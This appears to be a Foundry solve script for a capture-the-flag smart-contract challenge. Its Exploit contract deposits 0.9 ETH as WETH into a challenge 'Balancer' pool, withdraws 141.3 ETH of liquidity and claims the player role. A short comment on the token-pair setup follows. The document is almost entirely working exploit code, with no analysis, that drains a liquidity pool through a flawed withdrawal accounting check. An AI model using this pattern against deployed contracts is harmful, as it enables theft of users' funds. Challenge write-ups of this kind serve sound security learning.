pragma solidity ^0.8.20;

import {Setup} from "src/core/Setup.sol";
import "forge-std/Test.sol";
import "forge-std/Script.sol";
import {WhiteListed} from "src/core/WhiteListed.sol";
import {LamboToken} from "src/core/LamboToken.sol";
import {WETH9} from "src/core/WETH.sol";
import {Balancer} from "src/core/Balancer.sol";
import {Factory} from "src/core/Factory.sol";
import {VasthavikamainaToken} from "src/core/VasthavikamainaToken.sol";
import {SetConditions} from "script/Deploy.s.sol";
contract Solve is Script {
    function run() public {
        vm.startBroadcast();
        Setup setup = Setup(vm.envAddress("SETUP"));
        Exploit exploit = new Exploit{value: 0.9 ether}(address(setup));
        exploit.exploit();
        console.log("isSolved", setup.isSolved());
        vm.stopBroadcast();
    }
}

contract Exploit {
    Setup setup;
    WETH9 weth;
    Balancer balancer;
    constructor(address _setup) payable {
        setup = Setup(_setup);
        weth = setup.wETH9();
        balancer = setup.balancer();
    }
    function exploit() public {
        weth.deposit{value: 0.9 ether}(address(this));
        weth.approve(address(balancer), 0.9 ether);
        balancer.provideLiquidity(address(weth), 0.9 ether);
        balancer.takeOffLiquidity(address(weth), 141.3 ether);
        weth.withdraw(address(this), 141.3 ether);
        console.log("eth balance of sender", address(this).balance);
        setup.setPlayer(address(this));
    }
    receive() external payable {}
}

/*

in create pair, 
    pair has 100_000_000 lamboToken
    each pair has 20e18 loan (vast token)






*/